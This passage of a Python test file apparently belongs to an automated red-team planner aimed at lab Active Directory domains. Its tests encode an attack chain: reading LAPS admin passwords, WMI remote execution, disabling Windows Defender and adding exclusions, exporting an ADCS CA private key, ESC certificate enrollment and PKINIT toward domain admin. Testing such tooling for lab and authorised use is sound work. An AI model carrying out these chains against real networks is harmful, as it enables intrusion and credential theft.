            _hop("da:north.sevenkingdoms.local"),
            _hop("kerberos-context:north.sevenkingdoms.local@callback:3"),
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("da:sevenkingdoms.local"),
            _hop("kerberos-context:sevenkingdoms.local@callback:3"),
            _hop("krbtgt-hash:sevenkingdoms.local"),
            _hop(r"creds:sevenkingdoms\administrator@sevenkingdoms.local"),
            _hop(r"creds:sevenkingdoms\cersei.lannister@sevenkingdoms.local"),
        ],
    )

    actions = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "ensure-account-kerberos-context"
    ]

    assert [action.target for action in actions] == [
        "domain=sevenkingdoms.local;account=cersei.lannister;callback=3"
    ]


def test_local_admin_access_probe_rejects_sysvol_as_elevated_access():
    output = (
        " Volume in drive \\\\dc01.lab.local\\SYSVOL is Windows 10\n"
        " Directory of \\\\dc01.lab.local\\SYSVOL\n"
        "06/10/2026  12:00 PM    <DIR>          Policies\n"
    )

    probe = capabilities.extract_local_admin_access_probe(output, "dc01", "lab.local")
    verdict = capabilities.verify_capability("use-managed-local-admin-secret", {
        **probe,
        "callback_id": "13",
    })

    assert probe["admin_share_access_proven"] is False
    assert probe["local_admin_access_proven"] is False
    assert verdict.verdict != "achieved"


def test_managed_secret_read_suppressed_when_secret_already_verified():
    state = es.EngagementState(
        objective="read target managed local admin secret",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("kerberos-account-context:alice@lab.local@callback:13"),
            _hop("managed-local-admin-secret:ws01@child.lab.local"),
        ],
        graph_facts=[
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    assert "read-managed-local-admin-secret" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_build_managed_secret_read_plan_is_ldap_primitive():
    action = capabilities.CapabilityAction(
        name="read-managed-local-admin-secret",
        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=[
            "kerberos-account-context:alice@lab.local@callback:13",
            "can-read-managed-local-admin-secret:alice@lab.local->ws01@child.lab.local",
        ],
        effects=["managed-local-admin-secret:ws01@child.lab.local"],
        intent={
            "capability": "read-managed-local-admin-secret",
            "account": "alice",
            "account_domain": "lab.local",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {"domain_controller": "dc01.child.lab.local"})

    assert plan.ok is True
    assert len(plan.steps) == 1
    step = plan.steps[0]
    assert step.operation == "ldap-managed-local-admin-secret-read"
    assert step.parameters["target_host"] == "ws01"
    assert step.parameters["target_domain"] == "child.lab.local"
    assert step.parameters["account"] == "alice"
    assert step.parameters["account_domain"] == "lab.local"
    assert step.parameters["callback_id"] == "13"
    assert step.parameters["search_base"] == "DC=child,DC=lab,DC=local"
    assert step.expected_probe == "extract_managed_local_admin_secret_probe"
    _assert_payload_agnostic_plan(plan)


def test_managed_secret_probe_redacts_secret_and_requires_plaintext():
    output = "\n".join([
        "distinguishedname=CN=WS01,OU=Workstations,DC=child,DC=lab,DC=local",
        "ms-mcs-admpwd=CorrectHorseBatteryStaple!",
    ])

    probe = capabilities.extract_managed_local_admin_secret_probe(output, "ws01", "child.lab.local")
    achieved = capabilities.verify_capability("read-managed-local-admin-secret", {
        **probe,
        "callback_id": "13",
    })
    partial = capabilities.verify_capability("read-managed-local-admin-secret", {
        **capabilities.extract_managed_local_admin_secret_probe(
            "distinguishedname=CN=WS01\nms-mcs-admpwdexpirationtime=1337",
            "ws01",
            "child.lab.local",
        ),
        "callback_id": "13",
    })

    assert achieved.verdict == "achieved"
    assert achieved.evidence["secret_attribute"] == "ms-mcs-admpwd"
    assert "CorrectHorseBatteryStaple" not in json.dumps(achieved.evidence)
    assert partial.verdict == "partial"


def test_managed_secret_probe_handles_mythic_bytes_repr_output():
    output = (
        "b'samaccountname=WS01$\\r\\n"
        "dnshostname=ws01.child.lab.local\\r\\n"
        "ms-mcs-admpwd=&30j5ozTm8z/u]\\r\\n"
        "distinguishedname=CN=WS01,DC=child,DC=lab,DC=local\\r\\n'"
    )

    probe = capabilities.extract_managed_local_admin_secret_probe(output, "ws01", "child.lab.local")
    verdict = capabilities.verify_capability("read-managed-local-admin-secret", {
        **probe,
        "callback_id": "13",
    })

    assert probe["managed_local_admin_secret_present"] is True
    assert probe["secret_attribute"] == "ms-mcs-admpwd"
    assert verdict.verdict == "achieved"


def test_managed_secret_effect_unlocks_local_admin_use():
    state = es.EngagementState(
        objective="obtain remote admin on target",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("managed-local-admin-secret:ws01@child.lab.local")],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "use-managed-local-admin-secret"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "target=ws01;target_domain=child.lab.local;callback=13"
    assert action.preconditions == [
        "managed-local-admin-secret:ws01@child.lab.local",
        "live-callback:13",
    ]
    assert action.effects == [
        "local-admin:ws01@child.lab.local",
        "admin:ws01",
        "system-or-admin:ws01",
    ]


def test_local_admin_use_suppressed_when_host_admin_already_verified():
    state = es.EngagementState(
        objective="obtain remote admin on target",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("managed-local-admin-secret:ws01@child.lab.local"),
            _hop("admin:ws01"),
        ],
    )

    assert "use-managed-local-admin-secret" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_build_local_admin_use_plan_is_payload_agnostic_and_requires_secret():
    action = capabilities.CapabilityAction(
        name="use-managed-local-admin-secret",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["managed-local-admin-secret:ws01@child.lab.local", "live-callback:13"],
        effects=["local-admin:ws01@child.lab.local", "admin:ws01", "system-or-admin:ws01"],
        intent={
            "capability": "use-managed-local-admin-secret",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {})
    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})

    assert missing.ok is False
    assert missing.missing == ["password"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "local-admin-logon-session-create",
        "local-admin-service-proof",
    ]
    assert plan.steps[0].parameters["local_account"] == "Administrator"
    assert plan.steps[0].parameters["netonly"] is True
    assert plan.steps[1].parameters["resource"] == r"\\ws01.child.lab.local\C$"
    assert plan.steps[1].expected_probe == "extract_local_admin_access_probe"
    _assert_payload_agnostic_plan(plan)


def test_local_admin_access_probe_requires_admin_share_success():
    success = (
        " Volume in drive \\\\ws01.child.lab.local\\C$ has no label.\n"
        " Directory of \\\\ws01.child.lab.local\\C$\n"
        "06/10/2026  12:00 PM    <DIR>          Windows\n"
    )
    denied = "Access is denied."

    probe = capabilities.extract_local_admin_access_probe(success, "ws01", "child.lab.local")
    achieved = capabilities.verify_capability("use-managed-local-admin-secret", {
        **probe,
        "callback_id": "13",
    })
    blocked = capabilities.verify_capability("use-managed-local-admin-secret", {
        **capabilities.extract_local_admin_access_probe(denied, "ws01", "child.lab.local"),
        "callback_id": "13",
    })

    assert achieved.verdict == "achieved"
    assert achieved.evidence["admin_share_access_proven"] is True
    assert blocked.verdict == "blocked"


def test_local_admin_effect_unlocks_remote_execution():
    state = es.EngagementState(
        objective="execute on target",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("local-admin:ws01@child.lab.local")],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "execute-as-local-admin"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "target=ws01;target_domain=child.lab.local;callback=13"
    assert action.preconditions == [
        "local-admin:ws01@child.lab.local",
        "live-callback:13",
    ]
    assert action.effects == [
        "remote-exec:ws01@child.lab.local",
        "host-exec:ws01",
    ]


def test_remote_execution_suppressed_when_already_verified():
    state = es.EngagementState(
        objective="execute on target",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ws01@child.lab.local"),
            _hop("remote-exec:ws01@child.lab.local"),
        ],
    )

    assert "execute-as-local-admin" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_build_remote_execution_plan_is_payload_agnostic_and_requires_secret():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {})
    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})

    assert missing.ok is False
    assert missing.missing == ["password"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "local-admin-remote-command",
        "remote-file-read",
    ]
    assert plan.steps[0].parameters["local_account"] == "Administrator"
    assert plan.steps[0].parameters["method"] == "wmiexecute"
    assert "SAGE_REMOTE_EXEC_PROOF_ws01_13" in plan.steps[0].parameters["command"]
    assert plan.steps[1].parameters["path"] == r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"
    assert plan.steps[1].expected_probe == "extract_remote_execution_probe"
    _assert_payload_agnostic_plan(plan)


def test_remote_execution_plan_normalizes_unc_proof_directory():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=13",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:13"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "proof_path": r"\\ws01.child.lab.local\C$\Windows\Temp",
    })

    assert plan.ok is True
    assert plan.steps[0].parameters["proof_path"] == r"C:\Windows\Temp\sage_remote_exec_ws01_13.txt"
    assert r'> "C:\Windows\Temp\sage_remote_exec_ws01_13.txt"' in plan.steps[0].parameters["command"]
    assert plan.steps[1].parameters["path"] == r"\\ws01.child.lab.local\C$\Windows\Temp\sage_remote_exec_ws01_13.txt"

    escaped_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "proof_path": r"\ws01.child.lab.local\C$\Windows\Temp",
    })

    assert escaped_plan.ok is True
    assert escaped_plan.steps[0].parameters["proof_path"] == plan.steps[0].parameters["proof_path"]
    assert escaped_plan.steps[1].parameters["path"] == plan.steps[1].parameters["path"]


def test_adcs_ca_private_key_export_candidate_requires_remote_exec():
    state = es.EngagementState(
        objective="export ca key",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "adcs-ca-private-key-export"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "target=ca01;target_domain=lab.local;callback=13"
    assert action.preconditions == [
        "remote-exec:ca01@lab.local",
        "local-admin:ca01@lab.local",
        "live-callback:13",
    ]
    assert action.effects == [
        "adcs-ca-private-key:ca01@lab.local",
        "adcs-ca:ca01@lab.local",
    ]


def test_adcs_ca_private_key_export_suppressed_when_already_verified():
    state = es.EngagementState(
        objective="export ca key",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
            _hop("adcs-ca-private-key:ca01@lab.local"),
        ],
    )

    assert "adcs-ca-private-key-export" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_ca_key_blocker_suppresses_repeat_export_and_exposes_esc_enrollment():
    blocked_hop = es.Hop(
        id="blocked-ca-export",
        technique="capability:adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=13",
        effect="adcs-ca-private-key:ca01@lab.local",
        status="blocked",
        evidence={
            "verify_reason": "key not exportable",
            "target_host": "ca01",
            "target_domain": "lab.local",
        },
        preconditions=[],
        satisfied_effects=[],
        source="test",
        timestamp=NOW,
    )
    state = es.EngagementState(
        objective="prove domain admin with certificate enrollment",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
            blocked_hop,
        ],
    )

    names = [action.name for action in capabilities.actions_from_state(state)]
    enroll = next(action for action in capabilities.actions_from_state(state) if action.name == "adcs-esc-certificate-enroll")

    assert "adcs-ca-private-key-export" not in names
    assert enroll.target == "domain=lab.local;account=administrator;ca_host=ca01;callback=13"
    assert enroll.preconditions == [
        "adcs-ca-key-export-blocked:ca01@lab.local",
        "live-callback:13",
    ]
    assert enroll.effects == ["adcs-enrolled-certificate:administrator@lab.local"]


def test_endpoint_protection_adjustment_candidate_requires_endpoint_blocker():
    blocked_hop = es.Hop(
        id="failed-adcs",
        technique="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local",
        effect="adcs-ca-private-key:ca01@lab.local",
        status="blocked",
        evidence={
            "defender_blocked": True,
            "capability_target": "target=ca01;target_domain=lab.local",
        },
        preconditions=[],
        satisfied_effects=[],
        source="test",
        timestamp=NOW,
    )
    state = es.EngagementState(
        objective="export ca key",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
            blocked_hop,
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "endpoint-protection-adjustment"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "target=ca01;target_domain=lab.local;callback=13"
    assert action.preconditions == [
        "remote-exec:ca01@lab.local",
        "local-admin:ca01@lab.local",
        "live-callback:13",
    ]
    assert action.effects == ["endpoint-protection-adjusted:ca01@lab.local"]


def test_endpoint_protection_adjustment_not_proposed_without_endpoint_blocker():
    state = es.EngagementState(
        objective="export ca key",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
        ],
    )

    assert "endpoint-protection-adjustment" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_build_endpoint_protection_adjustment_plan_requires_remote_secret():
    action = capabilities.CapabilityAction(
        name="endpoint-protection-adjustment",
        target="target=ca01;target_domain=lab.local;callback=13",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:13",
        ],
        effects=["endpoint-protection-adjusted:ca01@lab.local"],
        intent={
            "capability": "endpoint-protection-adjustment",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {"method": "remote-wmi"})
    plan = capabilities.build_capability_execution_plan(action, {
        "method": "remote-wmi",
        "password": "CorrectHorseBatteryStaple!",
    })

    assert missing.ok is False
    assert missing.missing == ["password"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == ["endpoint-protection-adjustment"]
    step = plan.steps[0]
    assert step.parameters["provider"] == "windows-defender"
    assert step.parameters["method"] == "remote-wmi"
    assert step.parameters["proof_marker"] == "SAGE_EP_ADJUST_PROOF_ca01_13"
    assert step.parameters["exclusion_paths"] == [r"C:\Windows\Temp"]
    assert step.expected_probe == "extract_endpoint_protection_probe"
    _assert_payload_agnostic_plan(plan)


def test_endpoint_protection_probe_records_verified_adjustment():
    output = "\n".join([
        "SAGE_EP_ADJUST_PROOF_ca01_13",
        "EP_STATUS=OK",
        "EP_REALTIME_BEFORE=True",
        "EP_SET_STATUS=OK",
        "EP_REQUESTED_EXCLUSION=C:\\Windows\\Temp",
        "EP_EXCLUSION_PRESENT=True",
        "EP_REALTIME_AFTER=False",
    ])

    probe = capabilities.extract_endpoint_protection_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_EP_ADJUST_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("endpoint-protection-adjustment", probe)

    assert verdict.verdict == "achieved"
    assert probe["endpoint_adjustment_proven"] is True
    assert probe["requested_exclusion_present"] is True
    assert probe["realtime_disabled_after"] is True


def test_endpoint_protection_probe_blocks_tamper_protection():
    output = "\n".join([
        "SAGE_EP_ADJUST_PROOF_ca01_13",
        "EP_STATUS=OK",
        "EP_REALTIME_BEFORE=True",
        "EP_TAMPER_PROTECTED=True",
        "EP_SET_STATUS=FAILED",
        "EP_REALTIME_AFTER=True",
    ])

    probe = capabilities.extract_endpoint_protection_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_EP_ADJUST_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("endpoint-protection-adjustment", probe)

    assert verdict.verdict == "blocked"
    assert verdict.reason == "tamper protected"


def test_build_adcs_ca_private_key_export_plan_is_payload_agnostic_and_requires_secret():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=13",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:13",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {})
    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})

    assert missing.ok is False
    assert missing.missing == ["password"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == ["adcs-ca-private-key-export"]
    step = plan.steps[0]
    assert step.parameters["local_account"] == "Administrator"
    assert step.parameters["proof_marker"] == "SAGE_CA_EXPORT_PROOF_ca01_13"
    assert step.parameters["pfx_path"] == r"C:\Windows\Temp\sage_ca_export_ca01_13.pfx"
    assert step.parameters["metadata_path"] == r"C:\Windows\Temp\sage_ca_export_ca01_13.txt"
    assert step.parameters["adcs_ca_export_method"] == "certutil-backupkey"
    assert step.parameters["wait_seconds"] == "45"
    assert step.expected_probe == "extract_adcs_ca_private_key_probe"
    _assert_payload_agnostic_plan(plan)


def test_post_laps_adcs_export_default_is_ca_backup_not_native_pfx():
    state = es.EngagementState(
        objective="post LAPS ADCS finish",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("managed-local-admin-secret:ca01@lab.local"),
            _hop("local-admin:ca01@lab.local"),
            _hop("remote-exec:ca01@lab.local"),
        ],
    )

    action = next(action for action in capabilities.actions_from_state(state) if action.name == "adcs-ca-private-key-export")
    plan = capabilities.build_capability_execution_plan(action, {"password": "CorrectHorseBatteryStaple!"})

    assert plan.ok is True
    assert plan.steps[0].parameters["adcs_ca_export_method"] == "certutil-backupkey"


def test_build_adcs_ca_private_key_export_plan_supports_sharpdpapi_fallback():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=13",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:13",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "adcs_ca_export_method": "sharpdpapi",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == ["adcs-ca-private-key-dpapi-export"]
    step = plan.steps[0]
    assert step.parameters["tool"] == "SharpDPAPI.exe"
    assert step.parameters["staged_tool_path"] == r"C:\Windows\Temp\SharpDPAPI.exe"
    assert step.parameters["output_path"] == r"C:\Windows\Temp\sage_ca_dpapi_ca01_13.txt"
    assert "tool:SharpDPAPI.exe" in step.prerequisites
    _assert_payload_agnostic_plan(plan)


def test_build_adcs_esc_certificate_enroll_requires_ca_template_and_uses_cert_auth_artifact_path():
    action = capabilities.CapabilityAction(
        name="adcs-esc-certificate-enroll",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:13"],
        effects=["adcs-enrolled-certificate:administrator@lab.local"],
        intent={
            "capability": "adcs-esc-certificate-enroll",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {})
    plan = capabilities.build_capability_execution_plan(action, {
        "ca_name": r"ca01.lab.local\LAB-CA",
        "template": "VulnerableUser",
    })

    assert missing.ok is False
    assert missing.missing == ["ca_name", "template"]
    assert plan.ok is True
    assert [step.operation for step in plan.steps] == ["adcs-esc-certificate-enroll"]
    step = plan.steps[0]
    assert step.parameters["ca_name"] == r"ca01.lab.local\LAB-CA"
    assert step.parameters["template"] == "VulnerableUser"
    assert step.parameters["certificate_path"] == r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx"
    assert step.parameters["subject_alt_name"] == "administrator@lab.local"
    assert step.expected_probe == "extract_adcs_enrolled_certificate_probe"
    _assert_payload_agnostic_plan(plan)


def test_adcs_enrolled_certificate_probe_requires_certificate_and_private_key_material():
    pfx = base64.b64encode(b"0" + b"B" * 512).decode("ascii")
    output = "\n".join([
        "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_13",
        "CERT_ENROLL_STATUS=OK",
        "CERT_ENROLL_TEMPLATE=VulnerableUser",
        r"CERT_ENROLL_CA=ca01.lab.local\LAB-CA",
        "CERT_PFX_PATH=C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx",
        f"PFX_BASE64={pfx}",
    ])

    probe = capabilities.extract_adcs_enrolled_certificate_probe(
        output,
        "administrator",
        "lab.local",
        "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-esc-certificate-enroll", probe)

    assert verdict.verdict == "achieved"
    assert probe["enrolled_certificate_material_present"] is True
    assert probe["enrolled_certificate_private_key_present"] is True
    assert "PFX_BASE64" not in probe


def test_enrolled_certificate_unlocks_certificate_auth_without_ca_key_material():
    state = es.EngagementState(
        objective="prove domain admin with enrolled cert",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("adcs-enrolled-certificate:administrator@lab.local")],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "adcs-certificate-auth"]
    action = actions[0]
    plan = capabilities.build_capability_execution_plan(action, {"proof_host": "dc01.lab.local"})

    assert len(actions) == 1
    assert action.preconditions == [
        "adcs-enrolled-certificate:administrator@lab.local",
        "live-callback:13",
    ]
    assert action.intent["certificate_already_forged"] is True
    assert plan.ok is True
    assert "adcs-certificate-forge" not in [step.operation for step in plan.steps]
    assert plan.steps[2].operation == "certificate-pkinit-tgt"
    assert plan.steps[2].parameters["certificate_path"] == r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx"


def test_failed_certificate_auth_suppresses_repeat_candidate():
    failed_cert_auth = es.Hop(
        id="failed-cert-auth",
        technique="capability:adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        effect="da:lab.local",
        status="failed",
        evidence={"verify_reason": "PKINIT and Schannel LDAP did not prove certificate authentication"},
        preconditions=[],
        satisfied_effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        source="test",
        timestamp=NOW,
    )
    state = es.EngagementState(
        objective="prove domain admin with certificate auth certificate-auth-target:administrator@lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("adcs-ca-private-key:ca01@lab.local"),
            failed_cert_auth,
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "adcs-certificate-auth"]

    assert actions == []


def test_retryable_failed_certificate_auth_does_not_suppress_repeat_candidate():
    failed_cert_auth = es.Hop(
        id="failed-cert-auth",
        technique="capability:adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        effect="da:lab.local",
        status="failed",
        evidence={
            "verify_reason": "No answer from domain controller",
            "terminal_failure": False,
            "failure_class": "transient",
        },
        preconditions=[],
        satisfied_effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        source="test",
        timestamp=NOW,
    )
    state = es.EngagementState(
        objective="prove domain admin with certificate auth certificate-auth-target:administrator@lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("adcs-ca-private-key:ca01@lab.local"),
            failed_cert_auth,
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "adcs-certificate-auth"]

    assert len(actions) == 1


def test_adcs_ca_private_key_probe_requires_valid_pfx_material():
    pfx = base64.b64encode(b"0" + b"A" * 512).decode("ascii")
    output = "\n".join([
        "ReturnValue = 0",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "CA_EXPORT_STATUS=OK",
        "CA_SUBJECT=CN=LAB-CA",
        "CA_ISSUER=CN=LAB-CA",
        "CA_THUMBPRINT=ABCDEF123456",
        "CA_PFX_PATH=C:\\Windows\\Temp\\sage_ca_export_ca01_13.pfx",
        f"PFX_BASE64={pfx}",
    ])

    probe = capabilities.extract_adcs_ca_private_key_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-ca-private-key-export", probe)

    assert verdict.verdict == "achieved"
    assert probe["ca_private_key_material_present"] is True
    assert probe["pfx_sha256"]
    assert "PFX_BASE64" not in probe


def test_adcs_ca_private_key_probe_blocks_declared_pfx_sha_mismatch():
    pfx = base64.b64encode(b"0" + b"A" * 512).decode("ascii")
    output = "\n".join([
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "CA_EXPORT_STATUS=OK",
        "CA_SUBJECT=CN=LAB-CA",
        "CA_THUMBPRINT=ABCDEF123456",
        f"PFX_SHA256={'a' * 64}",
        f"PFX_BASE64={pfx}",
    ])

    probe = capabilities.extract_adcs_ca_private_key_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-ca-private-key-export", probe)

    assert probe["pfx_sha256_mismatch"] is True
    assert probe["pfx_blob_valid"] is False
    assert verdict.verdict == "blocked"
    assert verdict.reason == "pfx sha256 mismatch"


def test_adcs_ca_private_key_probe_accepts_sharpdpapi_pem_material():
    output = "\n".join([
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "SharpDPAPI v1.11",
        "Subject : CN=LAB-CA",
        "Thumbprint : ABCDEF123456",
        "-----BEGIN CERTIFICATE-----",
        "MIIB",
        "-----END CERTIFICATE-----",
        "-----BEGIN RSA PRIVATE KEY-----",
        "MIIE",
        "-----END RSA PRIVATE KEY-----",
    ])

    probe = capabilities.extract_adcs_ca_private_key_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-ca-private-key-export", probe)

    assert verdict.verdict == "achieved"
    assert probe["private_key_pem_present"] is True
    assert probe["certificate_pem_present"] is True


def test_adcs_ca_private_key_probe_blocks_no_ca_certificate():
    output = "\n".join([
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "CA_EXPORT_STATUS=NO_CA_CERTIFICATE",
    ])

    probe = capabilities.extract_adcs_ca_private_key_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-ca-private-key-export", probe)

    assert verdict.verdict == "blocked"
    assert verdict.reason == "no ca certificate"


def test_adcs_ca_private_key_probe_blocks_tool_execution_failure():
    output = "\n".join([
        "SAGE_CA_EXPORT_PROOF_ca01_13",
        "ReturnValue      : 0",
        "SharpDPAPI v1.11",
        "The system cannot execute the specified program.",
    ])

    probe = capabilities.extract_adcs_ca_private_key_probe(
        output,
        "ca01",
        "lab.local",
        "SAGE_CA_EXPORT_PROOF_ca01_13",
    )
    probe["callback_id"] = "13"
    verdict = capabilities.verify_capability("adcs-ca-private-key-export", probe)

    assert probe["tool_execution_failed"] is True
    assert verdict.verdict == "blocked"
    assert verdict.reason == "tool execution failed"


def test_adcs_certificate_auth_candidate_follows_verified_ca_key():
    state = es.EngagementState(
        objective="prove domain admin with certificate auth",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("adcs-ca-private-key:ca01@lab.local")],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "adcs-certificate-auth"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "domain=lab.local;account=administrator;ca_host=ca01;callback=13"
    assert action.preconditions == ["adcs-ca-private-key:ca01@lab.local", "live-callback:13"]
    assert action.effects == ["da:lab.local", "certificate-auth:administrator@lab.local"]


def test_build_adcs_certificate_auth_plan_uses_pkinit_artifact_not_ptt():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )

    missing = capabilities.build_capability_execution_plan(action, {})
    plan = capabilities.build_capability_execution_plan(action, {
